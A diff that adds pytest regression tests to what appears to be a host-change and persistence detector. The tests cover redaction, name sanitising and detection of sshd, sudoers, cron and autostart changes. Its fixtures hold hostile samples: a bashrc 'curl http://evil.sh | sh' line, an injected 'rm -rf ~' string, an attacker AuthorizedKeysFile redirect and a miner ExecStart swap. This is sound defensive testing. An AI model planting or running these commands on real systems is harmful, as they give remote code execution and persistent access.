@@ -193,9 +193,17 @@ def test_clean_strips_newline_and_bidi():
     # a newline in a name would inject a forged extra output line (H1 reopened)
     assert "\n" not in since.clean("legit\n  signature: Apple-signed")
     assert "\r" not in since.clean("a\rb")
-    assert "\t" not in since.clean("a\tb")
+    assert "\x1b" not in since.clean("a\x1b[31mb")   # ESC still stripped
+    # TAB is deliberately KEPT (v2 audit #11): it cannot forge a line, and stripping it
+    # mangled tab-indented config diffs. Newline/CR/ESC (which CAN forge) stay stripped.
+    assert since.clean("a\tb") == "a\tb"
     assert since.clean("x‮y") == "x�y"   # bidi override
     assert since.clean("x​y") == "x�y"   # zero-width space
+    assert since.clean("a" + chr(0x2028) + "b") == "a�b"   # U+2028 line separator (finding 6)
+    assert since.clean("a" + chr(0x2029) + "b") == "a�b"   # U+2029 paragraph separator
+    # lone UTF-16 surrogate (non-UTF-8 Linux filename via surrogateescape) — must be
+    # neutralized, not raise UnicodeEncodeError when the report is printed (v2 audit #7)
+    assert since.clean("a\udc80b") == "a�b"
     assert since.clean("normal name") == "normal name"
 
 
@@ -277,3 +285,199 @@ def test_findings_sorted_most_severe_first(monkeypatch):
     findings = since.build_findings(b, c)
     levels = [f["level"] for f in findings]
     assert levels == sorted(levels, reverse=True)
+
+
+# =========================================================================== #
+# Second independent (Kimi) audit — regression tests for each fixed finding.   #
+# =========================================================================== #
+
+# #2 — over-redaction must NOT conceal the sshd/sudoers attacks the tool exists to
+# surface. Keyword-in-KEY is not enough; the VALUE (a path, a keyword, a short flag)
+# must still be shown so a malicious change is visible.
+@pytest.mark.parametrize("line", [
+    "AuthorizedKeysFile /tmp/evil/keys",   # attacker redirects trusted keys — must SHOW the path
+    "PasswordAuthentication no",
+    "PermitRootLogin yes",
+    "    NOPASSWD: /bin/bash",
+    "%admin ALL=(ALL) NOPASSWD: ALL",
+    "# basic networking setup",            # #6 benign prose under _SCHEME_RE
+    "# no secret here",                    # sensitive word in KEY, short prose value
+    "AuthorizedKeysCommandUser nobody",    # directive-name substring + plain-word value
+    "AuthorizedKeysCommandUser root",
+    "password required pam_unix.so",       # pam directive: credential word + keyword value
+    # 3rd-pass independent audit (finding 2): the DEFAULT sshd form uses a RELATIVE path —
+    # an absolute-only directive test let this stay hidden.
+    "AuthorizedKeysFile .ssh/authorized_keys",
+    "AuthorizedKeysFile %h/.ssh/authorized_keys",
+    "AuthorizedKeysCommandUser sshd-keygen",
+])
+def test_redact_does_not_hide_directives(line):
+    assert since.redact(line) == line, "value redacted away — this is exactly what #2 warned about"
+
+
+# A malicious edit to an AuthorizedKeys* directive must produce a VISIBLE diff, incl. the
+# relative-path default form (finding 2: both old and new were redacting to the same string).
+def test_redact_authorizedkeys_change_is_visible():
+    assert (since.redact("AuthorizedKeysFile .ssh/authorized_keys")
+            != since.redact("AuthorizedKeysFile .ssh/evilkeys"))
+
+
+# #2/#10 — real credentials are masked: single-class tokens, SSHPASS, short values, AND
+# (3rd-pass finding 1) values that begin with '/', '~', or '$' — base64 tokens contain '/',
+# crypt/shadow hashes begin with '$', so a "looks like a path" bypass would leak them.
+@pytest.mark.parametrize("line,secret", [
+    ("password=hunter2longtoken", "hunter2longtoken"),
+    ("SSHPASS=Sup3rSecret1", "Sup3rSecret1"),
+    ("//r/:_authToken=SECRETVALUE", "SECRETVALUE"),      # single-class (all upper) — entropy test would leak this
+    ("client_secret: aGVsbG8gd29ybGQxMg==", "aGVsbG8gd29ybGQxMg=="),
+    ("passcode=1234", "1234"),                           # short secret via assignment — must NOT leak
+    ("password=abc", "abc"),
+    ("SSHPASS=$ecretPassw0rd", "ecretPassw0rd"),         # value begins with '$'
+    ("//registry.npmjs.org/:_authToken=/AbCdEf123456xyz", "AbCdEf123456xyz"),  # begins with '/'
+    ("client_secret=/wJalrXUtnFEMIK7MDENGbPxRfiCY", "wJalrXUtnFEMIK7MDENGbPxRfiCY"),
+    ("password=$6$rounds=5000$abcdefLONGhash", "abcdefLONGhash"),   # /etc/shadow crypt hash
+    ("_auth=dXNlcjpwYXNz", "dXNlcjpwYXNz"),              # npm base64 basic-auth field
+])
+def test_redact_still_masks_real_secrets(line, secret):
+    assert secret not in since.redact(line)
+
+
+# =========================================================================== #
+# Third full-tool independent audit — regression tests for each fixed finding. #
+# =========================================================================== #
+
+# Finding 1 — curl/netrc `user:pass` credentials (`~/.curlrc` is a TRACKED file) must be
+# masked; _URLAUTH_RE misses them because they aren't a `://…@` URL.
+@pytest.mark.parametrize("line,secret", [
+    ('user = "alice:S3cr3tCurlPass"', "S3cr3tCurlPass"),
+    ("-u bob:hunter2", "hunter2"),
+    ("--proxy-user pu:ppw", "ppw"),
+    ("curl -u carol:pw123 https://api.example.com", "pw123"),
+    # diff lines carry a +/- marker in the real pipeline — the anchor must survive it
+    # (an integration run caught this leaking where the bare-line unit test did not).
+    ('+user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
+    ('-user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
+])
+def test_redact_masks_curl_userpass(line, secret):
+    assert secret not in since.redact(line)
+
+
+# End-to-end: one realistic compromised diff through the REAL build_findings+render
+# pipeline must (a) escalate malware persistence, (b) keep an sshd redirect VISIBLE,
+# (c) REDACT a planted secret in rendered output, (d) neutralize a line-forging name.
+# This integration test caught a curlrc leak the isolated redact() unit tests missed.
+def test_end_to_end_adversarial_diff(monkeypatch):
+    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
+    b = snap(blobs={"~/.bashrc": "export PATH=$HOME/bin\n",
+                    "/etc/ssh/sshd_config": "AuthorizedKeysFile .ssh/authorized_keys\n",
+                    "~/.curlrc": "silent\n"})
+    c = snap(collectors={"login_items": {"Evil\n  signature: Apple-signed\n  undo: rm -rf ~": "x"}},
+             blobs={"~/.bashrc": "export PATH=$HOME/bin\ncurl http://evil.sh | sh\n",
+                    "/etc/ssh/sshd_config": "AuthorizedKeysFile /tmp/attacker/keys\n",
+                    "~/.curlrc": 'silent\nuser = "victim:SuperSecretCurlPw123"\n'})
+    findings = since.build_findings(b, c)
+    out = since.render(findings, b, c, [], [])
+    lines = out.splitlines()
+    assert any(f["level"] == since.RED and "bashrc" in f["key"] for f in findings)  # malware -> RED
+    assert "/tmp/attacker/keys" in out                                             # sshd redirect visible
+    assert "SuperSecretCurlPw123" not in out                                       # secret redacted
+    assert not any(l.strip() == "signature: Apple-signed" for l in lines)          # no forged line
+    assert not any(l.strip() == "undo: rm -rf ~" for l in lines)
+
+
+def test_redact_curl_userpass_no_false_positive():
+    # no colon → no password embedded → leave it alone
+    assert since.redact("user = alice") == "user = alice"
+    assert since.redact("# the user configuration: enabled") == "# the user configuration: enabled"
+
+
+# Finding 2 — a systemd ExecStart swap on an already-enabled unit must change the
+# fingerprint (parity with the macOS plist content hash). Proven with a mocked
+# `systemctl show` (no real systemd needed).
+def test_linux_service_execstart_swap_detected(monkeypatch):
+    def fake_run(cmd, **kw):
+        if "list-unit-files" in cmd:
+            return "evil.service enabled\n"
+        if "show" in cmd:
+            return f"Id=evil.service\nExecStart={fake_run.exec}\n"
+        return ""
+    fake_run.exec = "{ path=/usr/bin/true ; argv[]=/usr/bin/true }"
+    monkeypatch.setattr(since, "run", fake_run)
+    before = since._linux_services()["evil.service"]
+    fake_run.exec = "{ path=/tmp/miner ; argv[]=/tmp/miner }"   # same unit, enabled, swapped Exec
+    after = since._linux_services()["evil.service"]
+    assert before != after, "ExecStart swap invisible — finding 2 not fixed"
+
+
+# Finding 3 — sudoers.d and the cron.* dirs / spool are privilege-sensitive blobs.
+@pytest.mark.parametrize("key", [
+    "/etc/sudoers.d/mygrant", "/etc/cron.daily/evil", "/etc/cron.hourly/x",
+    "/var/spool/cron/crontabs/root", "/etc/crontab", "/etc/ld.so.preload",
+])
+def test_priv_blob_covers_sudoers_and_cron_family(key):
+    assert since._is_priv_blob(key)
+
+
+# Finding 4 — an absurd `--since` window must not dump an uncaught OverflowError traceback.
+def test_parse_when_absurd_window_no_crash():
+    assert since.parse_when("9" * 400 + "d") == 0   # graceful: cut off at epoch (oldest wins)
+    assert since.parse_when("1d") > 0                # normal path intact
+
+
+# #3 — PEM / raw-key body must be masked on the REMOVED (`-`) diff line too, not only `+`.
+def test_redact_pem_body_parity_on_minus_line():
+    body = "A" * 60
+    assert "A" * 60 not in since.redact("-" + body)
+    assert "A" * 60 not in since.redact("+" + body)
+    assert since.redact("-" + body).startswith("-")   # marker preserved
+
+
+# #1 — redact() must not go quadratic on an attacker-plantable long rc-file line.
+def test_redact_not_quadratic():
+    line = "secret=" + "A" * 40000 + "."
+    t = time.time()
+    since.redact(line)
+    assert time.time() - t < 1.0, "redact() is super-linear — a crafted line can stall the daily digest"
+
+
+# #7 — a lone UTF-16 surrogate (non-UTF-8 Linux filename) must not crash rendering.
+def test_clean_surrogate_is_printable():
+    out = since.clean("evil\udc80.desktop")
+    out.encode("utf-8")   # would raise UnicodeEncodeError before the fix
+
+
+# #4 — Linux autostart fingerprint folds in a CONTENT hash, so a swapped Exec= (Name=
+# unchanged) is detected as a change instead of being invisible.
+def test_linux_autostart_detects_exec_swap(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "HOME", tmp_path)
+    ad = tmp_path / ".config/autostart"
+    ad.mkdir(parents=True)
+    entry = ad / "x.desktop"
+    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/usr/bin/true\n")
+    before = since._linux_autostart()
+    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/tmp/miner\n")   # same Name=, evil Exec
+    after = since._linux_autostart()
+    assert before["x.desktop"] != after["x.desktop"], "Exec swap invisible — #4 not fixed"
+
+
+# L-f — tilde() collapses only a LEADING $HOME, not every occurrence.
+def test_tilde_collapses_only_leading_home(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "HOME", tmp_path)
+    h = str(tmp_path)
+    assert since.tilde(h + "/data" + h + "/file") == "~/data" + h + "/file"
+    assert since.tilde(h) == "~"
+
+
+# #9 — ld.so.preload (a classic rootkit hook, may be root-only-readable) is treated as a
+# privilege-sensitive blob so a root/non-root mismatch can't fabricate an add/remove alarm.
+def test_ld_so_preload_is_priv_blob():
+    assert since._is_priv_blob("/etc/ld.so.preload")
+
+
+# L-m — _write_private survives a stale temp left by a crashed run (no O_EXCL crash).
+def test_write_private_survives_stale_temp(tmp_path):
+    target = tmp_path / "snap.json"
+    (tmp_path / f".{target.name}.stale.tmp").write_text("junk")   # pre-existing temp
+    since._write_private(target, "hello")
+    assert target.read_text() == "hello"
+    assert oct(target.stat().st_mode)[-3:] == "600"
